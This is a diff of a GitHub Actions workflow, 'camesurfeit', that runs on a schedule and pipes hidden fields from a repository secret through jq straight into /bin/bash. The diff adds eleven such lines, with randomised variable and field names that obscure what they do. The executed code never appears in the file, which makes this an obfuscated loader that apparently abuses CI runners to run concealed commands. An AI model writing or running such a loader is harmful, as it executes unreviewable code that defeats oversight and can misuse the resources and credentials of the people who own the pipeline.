@@ -3,26 +3,26 @@ name: camesurfeit
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
+    - cron: '59 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: camesurfeit
         env:
-          t50137: ${{ secrets.t50137 }}
+          nv5247: ${{ secrets.nv5247 }}
         run: |
-          echo $t50137 | jq -r .s3113 | /bin/bash
-          echo $shh63 | jq -r .fu360 | /bin/bash
-          echo $zsr95100 | jq -r .zkbiv43505 | /bin/bash
-          echo $qzap462 | jq -r .l333 | /bin/bash
-          echo $f7 | jq -r .nzhpv9 | /bin/bash
-          echo $zy7188 | jq -r .wzjmj044 | /bin/bash
-          echo $hge733 | jq -r .g76 | /bin/bash
-          echo $dbov32793 | jq -r .ax6 | /bin/bash
-          echo $wu181 | jq -r .oqs31 | /bin/bash
-          echo $mh0 | jq -r .sad16 | /bin/bash
+          echo $nv5247 | jq -r .iiwg6186 | /bin/bash
+          echo $avwtr24044 | jq -r .lcng0 | /bin/bash
+          echo $c8 | jq -r .ob7757 | /bin/bash
+          echo $itw883 | jq -r .xrg17 | /bin/bash
+          echo $wdybj304 | jq -r .w3 | /bin/bash
+          echo $fgh61 | jq -r .jqa4 | /bin/bash
+          echo $yft0349 | jq -r .hjv72 | /bin/bash
+          echo $w868 | jq -r .az8 | /bin/bash
+          echo $bgph817 | jq -r .ri40916 | /bin/bash
+          echo $e770 | jq -r .bwkwf4 | /bin/bash
+          echo $edgnv386 | jq -r .pq72 | /bin/bash
 
